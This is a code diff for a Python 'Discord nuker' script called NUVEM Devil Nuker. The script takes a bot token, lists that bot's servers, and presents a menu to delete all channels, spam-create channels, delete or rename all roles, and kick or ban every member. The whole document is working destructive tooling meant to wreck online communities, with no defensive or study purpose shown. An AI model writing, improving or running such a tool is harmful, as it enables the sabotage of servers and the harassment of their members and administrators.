@@ -1,62 +1,135 @@
-import time
 import sys
+import time
+import requests
 from nuker import Nuker
-from utils import clear, slow_print, rgb_devils_colors
+from utils import clear, rocket_animation, rgb_print, print_rgb_header
 
-VERSION = "0.004"
-NAME = "NUVEM"
-
-def print_header():
-    clear()
-    # RGB devil colors cycling
-    colors = rgb_devils_colors(delay=0.03, cycles=1)
-    try:
-        for _ in range(3):
-            color = next(colors)
-            print(color + f"=== {NAME} DEVIL MENU v{VERSION} ===\033[0m")
-            time.sleep(0.3)
-            clear()
-    except StopIteration:
-        pass
-    print(f"\033[31m=== {NAME} DEVIL MENU v{VERSION} ===\033[0m\n")
-
-def select_server_menu(servers):
-    while True:
-        clear()
-        print_header()
-        if not servers:
-            print("No servers found for this bot token.")
-            return None
-        print("Select a server to nuke:\n")
-        for idx, server in enumerate(servers, start=1):
-            print(f"{idx}. {server['name']} (ID: {server['id']})")
-        print("0. Exit")
-        choice = input("\nEnter choice: ")
-        if choice.isdigit():
-            choice = int(choice)
-            if choice == 0:
-                return None
-            elif 1 <= choice <= len(servers):
-                return servers[choice - 1]['id']
-        print("Invalid choice, try again.")
-        time.sleep(1)
+def fetch_guilds(token):
+    url = "https://discord.com/api/v10/users/@me/guilds"
+    headers = {"Authorization": f"Bot {token}"}
+    r = requests.get(url, headers=headers)
+    if r.status_code == 200:
+        return r.json()
+    return []
 
 def main():
     clear()
-    print_header()
-    token = input("Enter your Bot Token: ").strip()
-    nuker = Nuker(token)
+    print_rgb_header("=== NUVEM Devil Nuker ===\n")
 
-    servers = nuker.get_servers()
-    guild_id = select_server_menu(servers)
-    if guild_id is None:
-        print("Exiting...")
-        return
+    token = input("Enter your bot token: ").strip()
 
-    clear()
-    slow_print("Preparing to nuke selected server...", delay=0.03)
-    nuker.nuke(guild_id)
-    print("\nAll done! Thanks for using NUVEM.")
+    print("\nFetching your guilds...")
+    guilds = fetch_guilds(token)
+    if not guilds:
+        print("No guilds found or invalid token.")
+        sys.exit()
+
+    print("\nSelect a guild:")
+    for idx, g in enumerate(guilds):
+        print(f"{idx+1}. {g['name']}")
+
+    while True:
+        try:
+            choice = int(input("\nGuild number: "))
+            if 1 <= choice <= len(guilds):
+                break
+            print("Invalid choice.")
+        except ValueError:
+            print("Enter a valid number.")
+
+    guild = guilds[choice - 1]
+    nuker = Nuker(token, guild['id'])
+
+    while True:
+        clear()
+        print_rgb_header(f"NUVEM Devil Nuker - {guild['name']}\n")
+        print("1. Delete All Channels")
+        print("2. Spam Channels (custom name)")
+        print("3. Delete All Roles")
+        print("4. Rename All Roles (custom name)")
+        print("5. Kick All Members")
+        print("6. Ban All Members")
+        print("7. Exit")
+
+        action = input("\nChoose action: ").strip()
+
+        if action == '1':
+            clear()
+            print("Deleting all channels...")
+            rocket_animation()
+            channels = nuker.get_channels()
+            for ch in channels:
+                nuker.delete_channel(ch['id'])
+                time.sleep(0.05)
+            input("Channels deleted. Press Enter to continue.")
+
+        elif action == '2':
+            name = input("Enter channel name to spam: ").strip()
+            amount = input("Number of channels to create: ").strip()
+            if not amount.isdigit():
+                input("Invalid number. Press Enter.")
+                continue
+            amount = int(amount)
+            clear()
+            print(f"Creating {amount} channels named '{name}'...")
+            rocket_animation()
+            for _ in range(amount):
+                nuker.create_channel(name)
+                time.sleep(0.05)
+            input("Channels created. Press Enter to continue.")
+
+        elif action == '3':
+            clear()
+            print("Deleting all roles...")
+            rocket_animation()
+            roles = nuker.get_roles()
+            # skip @everyone role (usually id = guild id)
+            for role in roles:
+                if role['name'] != "@everyone":
+                    nuker.delete_role(role['id'])
+                    time.sleep(0.05)
+            input("Roles deleted. Press Enter to continue.")
+
+        elif action == '4':
+            new_name = input("Enter new role name to rename all roles: ").strip()
+            clear()
+            print(f"Renaming all roles to '{new_name}'...")
+            rocket_animation()
+            roles = nuker.get_roles()
+            for role in roles:
+                if role['name'] != "@everyone":
+                    nuker.rename_role(role['id'], new_name)
+                    time.sleep(0.05)
+            input("Roles renamed. Press Enter to continue.")
+
+        elif action == '5':
+            clear()
+            print("Kicking all members...")
+            rocket_animation()
+            members = nuker.get_members()
+            for member in members:
+                nuker.kick_member(member['user']['id'])
+                time.sleep(0.05)
+            input("Members kicked. Press Enter to continue.")
+
+        elif action == '6':
+            clear()
+            print("Banning all members...")
+            rocket_animation()
+            members = nuker.get_members()
+            for member in members:
+                nuker.ban_member(member['user']['id'])
+                time.sleep(0.05)
+            input("Members banned. Press Enter to continue.")
+
+        elif action == '7':
+            print("Exiting...")
+            break
+
+        else:
+            print("Invalid choice.")
+            time.sleep(1)
+
 
 if __name__ == "__main__":
     main()
